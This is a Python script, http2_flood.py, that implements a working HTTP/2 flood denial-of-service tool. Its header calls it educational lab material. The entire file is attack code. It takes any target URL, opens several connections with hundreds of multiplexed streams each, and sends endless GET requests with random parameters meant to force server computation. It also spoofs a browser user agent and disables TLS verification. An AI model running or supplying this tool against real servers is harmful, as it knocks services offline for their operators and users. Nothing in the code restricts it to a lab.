
# http2_flood.py - Basic HTTP/2 Flood Attack
# This is the basic HTTP/2 flood attack implementation for educational labs.
# Demonstrates fundamental HTTP/2 multiplexing vulnerabilities.

import httpx
import asyncio
import threading
import time
import sys
import os
import random
import string

# --- Configuration ---
# Get target URL from command-line arguments
if len(sys.argv) < 2:
    print("Usage: python http2_flood.py <URL> [connections]")
    sys.exit(1)

target_url = sys.argv[1]
# Get actual TCP connection count from command-line or environment
concurrent_connections = int(sys.argv[2]) if len(sys.argv) > 2 else int(os.getenv("CONNECTIONS", 4))
# Get streams per connection from environment
streams_per_connection = int(os.getenv("STREAMS", 256))

print(f"Attacking {target_url} with {concurrent_connections} TCP connections, {streams_per_connection} streams each.")
print(f"Total concurrent streams: {concurrent_connections * streams_per_connection}")

# This user agent makes the request look like it's from a real browser
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
}

# Global counter for successful requests
successful_requests = 0
running = True

def generate_random_block_data():
    """
    Generates a random scrambled string and send it to the server.
    This ensures each request requires unique computational work on the server.
    """
    # Generate random length between 20-100 characters
    length = random.randint(20, 100)
    
    # Mix of letters, numbers, and some special characters
    chars = string.ascii_letters + string.digits + '_-.'
    
    # Generate random string
    random_data = ''.join(random.choice(chars) for _ in range(length))
    
    # Add some realistic blockchain-like prefixes occasionally
    prefixes = ['block_', 'tx_', 'data_', 'hash_', 'chain_']
    if random.random() < 0.3:  # 30% chance to add prefix
        random_data = random.choice(prefixes) + random_data
    
    return random_data

async def attack_worker(client, client_id, stream_id):
    """
    Individual HTTP/2 attack worker for a specific connection and stream.
    Uses HTTP/2 multiplexing to send requests over dedicated connection.
    """
    global successful_requests
    while running:
        try:
            # Generate random block data for this request
            block_data = generate_random_block_data()
            
            # Send GET request with block_data parameter to force server computation
            params = {'block_data': block_data}
            response = await client.get(target_url, headers=headers, params=params, timeout=10.0)
            
            # We consider any 2xx or 3xx status code a "success"
            if 200 <= response.status_code < 400:
                successful_requests += 1
                # Occasionally print successful computation details with connection info
                if successful_requests % 50 == 0:
                    try:
                        result = response.json()
                        print(f"[Conn {client_id}] Server computed: Block={result.get('block_data', '')[:20]}... | Answer={result.get('block_data', '')[:20]}")
                    except:
                        pass

        except httpx.RequestError:
            # This will catch timeouts, connection errors, etc.
            pass
        except Exception:
            pass

async def http2_attack():
    """
    Main HTTP/2 attack function using multiple connections with stream multiplexing.
    Creates multiple TCP connections, each handling multiple HTTP/2 streams.
    """
    print(f"Creating {concurrent_connections} separate HTTP/2 connections...")
    
    # Create multiple HTTP/2 clients - each creates separate TCP connection
    clients = []
    tasks = []
    
    try:
        # Create separate client for each TCP connection
        for client_id in range(concurrent_connections):
            # Force separate connections by using individual clients with max_connections=1
            limits = httpx.Limits(max_connections=1, max_keepalive_connections=1)
            transport = httpx.AsyncHTTPTransport(http2=True, http1=False, limits=limits)
            client = httpx.AsyncClient(
                transport=transport, 
                timeout=httpx.Timeout(10.0), 
                verify=False
            )
            clients.append(client)
            
            # Create streams_per_connection workers for this client
            for stream_id in range(streams_per_connection):
                task = asyncio.create_task(attack_worker(client, client_id, stream_id))
                tasks.append(task)
        
        print(f"Started {len(tasks)} concurrent streams across {len(clients)} connections")
        
        try:
            # Wait for all tasks to complete (they won't until interrupted)
            await asyncio.gather(*tasks)
        except KeyboardInterrupt:
            # Cancel all tasks
            for task in tasks:
                task.cancel()
            await asyncio.gather(*tasks, return_exceptions=True)
    
    finally:
        # Clean up all clients
        for client in clients:
            await client.aclose()

def print_stats():
    """
    Prints attack statistics including connections and streams.
    """
    global successful_requests
    last_count = 0
    while running:
        time.sleep(1)
        # Calculate requests per second
        requests_per_second = successful_requests - last_count
        total_streams = concurrent_connections * streams_per_connection
        print(f"Requests/sec: {requests_per_second} | Total: {successful_requests} | Connections: {concurrent_connections} | Streams: {total_streams}")
        last_count = successful_requests

def run_attack_with_stats():
    """
    Wrapper function to run HTTP/2 attack with statistics in separate thread.
    """
    # Start the statistics thread
    stats_thread = threading.Thread(target=print_stats, daemon=True)
    stats_thread.start()
    
    # Run the HTTP/2 attack
    try:
        asyncio.run(http2_attack())
    except KeyboardInterrupt:
        print("\nStopping HTTP/2 attack...")
        global running
        running = False
        print("Attack finished.")

if __name__ == "__main__":
    print("Starting HTTP/2 flood attack...")
    print("This attack uses HTTP/2 multiplexing to send multiple requests per connection.")
    print("Press Ctrl+C to stop the attack.")
    
    run_attack_with_stats()
